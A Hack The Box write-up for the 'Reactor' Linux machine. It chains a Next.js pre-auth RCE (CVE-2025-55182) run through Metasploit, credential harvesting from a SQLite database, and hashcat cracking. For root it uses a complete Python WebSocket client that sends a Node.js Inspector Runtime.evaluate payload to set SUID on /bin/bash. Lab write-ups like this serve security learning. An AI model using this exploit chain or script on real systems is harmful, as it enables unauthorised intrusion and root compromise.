# Reactor — HTB Machine

**Platform:** Hack The Box
**Difficulty:** Hard
**Type:** Linux Machine
**Objective:** Obtain user and root flags
**Key Vulnerabilities:** CVE-2025-55182 (Next.js pre-auth RCE) → credential reuse → Node.js Inspector (CDP) unauthenticated RCE as root
**Status:** ✅ Completed

---

## Attack Flow

```text
Nmap --> 22 (ssh), 3000 (Next.js)
Wappalyzer --> Next.js 15.0.3
CVE-2025-55182 (React2Shell) --> Metasploit --> shell as "node"
.env + reactor.db (SQLite) --> MD5 password hashes
Hashcat cracks hash --> engineer:reactor1
SSH as engineer --> user.txt
ps aux --> root-owned node process, port 9229 (Inspector) local only
Unauthenticated CDP --> custom WebSocket client --> Runtime.evaluate
chmod u+s /bin/bash --> root shell --> root.txt
```

---

## 1. Recon

```bash
ping -c 4 10.129.60.159
nmap -sS -n -Pn -oN scan -F 10.129.60.159
```

```text
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

```bash
nmap -sS -n -Pn -oN scanversions -p 22,3000 -A 10.129.60.159
```

Headers confirm a Next.js app (`X-Powered-By: Next.js`).

---

## 2. Fingerprinting

No directories found via fuzzing. Installing **Wappalyzer** and reloading the page reveals the framework version directly:

![Wappalyzer identifying Next.js 15.0.3](reactor-1-wappalyzer-nextjs.png)

Confirmed: **Next.js 15.0.3**

---

## 3. Exploitation — CVE-2025-55182 (React2Shell)

Pre-authentication RCE in Next.js, exploited via Metasploit:

```bash
msfconsole
use multi/http/react2shell_unauth_rce_cve_2025_55182
set RHOSTS 10.129.60.159
set RPORT 3000
set LHOST <attacker-ip>
exploit
```

Result: command shell as user `node`. Upgrade to interactive shell:

```bash
script /dev/null -c /bin/bash
```

---

## 4. Credential Harvesting

```bash
cat .env
sqlite3 reactor.db
.tables
SELECT * FROM users;
```

```text
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

MD5 hashes — crack with Hashcat:

```bash
hashcat -a 0 -m 0 engineer.txt ~/Desktop/Lists/Rockyou/rockyou.txt
```

```text
engineer:reactor1
```

---

## 5. User Flag

```bash
ssh engineer@10.129.60.159
```

```bash
engineer@reactor:~$ cat user.txt
```

```
01e7b1759cd27e0b1ec633caee73c9f3
```

✅ User flag obtained.

---

## 6. Root — Node.js Inspector (CDP) Exploitation

```bash
ps aux
netstat -l
```

Root-owned `node` process with the Inspector listening on loopback:

```bash
cat /proc/1386/cmdline | tr '\0' ' '
# /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
curl -s http://localhost:9229/json
```

CDP has no authentication — TCP reachability plus the session ID is full control. No `websocket-client` or internet access on the box, so a minimal pure-Python WebSocket client (stdlib `socket` only) handles the handshake and framing manually to send `Runtime.evaluate`:

```python
import socket
import base64
import os
import json
import struct

HOST = "127.0.0.1"
PORT = 9229
PATH = "/9fa41933-497b-4c66-9d56-9e65488c80a9"  # from /json response

def ws_handshake(sock):
    key = base64.b64encode(os.urandom(16)).decode()
    req = (
        f"GET {PATH} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n"
    )
    sock.sendall(req.encode())
    resp = sock.recv(4096)
    if b"101" not in resp.split(b"\r\n")[0]:
        raise Exception("Handshake failed: " + resp.decode(errors="replace"))

def ws_send_text(sock, data):
    payload = data.encode()
    length = len(payload)
    mask = os.urandom(4)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    if length <= 125:
        header = struct.pack("!BB", 0x81, 0x80 | length)
    elif length <= 65535:
        header = struct.pack("!BBH", 0x81, 0x80 | 126, length)
    else:
        header = struct.pack("!BBQ", 0x81, 0x80 | 127, length)
    sock.sendall(header + mask + masked)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))
ws_handshake(sock)

payload = {
    "id": 1,
    "method": "Runtime.evaluate",
    "params": {
        "expression": "require('child_process').execSync('chmod u+s /bin/bash').toString()",
        "includeCommandLineAPI": True
    }
}

ws_send_text(sock, json.dumps(payload))
sock.close()
```

`Runtime.evaluate` runs JS in the same context/privileges as the target process — root, in this case.

```bash
python3 exploit.py
ls -la /bin/bash    # -rwsr-xr-x
/bin/bash -p        # root shell
bash-5.2# cat root.txt
```

```
3c0c5902ec2add1a3b5594e21c8bb93f
```

✅ Root flag obtained — machine fully completed.

---

## Why It Works

- Next.js pre-auth RCE requires no valid session or credentials at all
- Weak MD5 hashing and a locally readable SQLite DB make credential harvesting trivial
- Password reuse bridges an application account straight to SSH access
- A root-owned process runs with the Node Inspector exposed, even on loopback-only
- Chrome DevTools Protocol has no built-in authentication — reachability is compromise

---

## References

- [CVE-2025-55182 PoC (React2Shell)](https://github.com/acheong08/CVE-2025-55182-poc/tree/main)
- Node.js Inspector / Chrome DevTools Protocol documentation
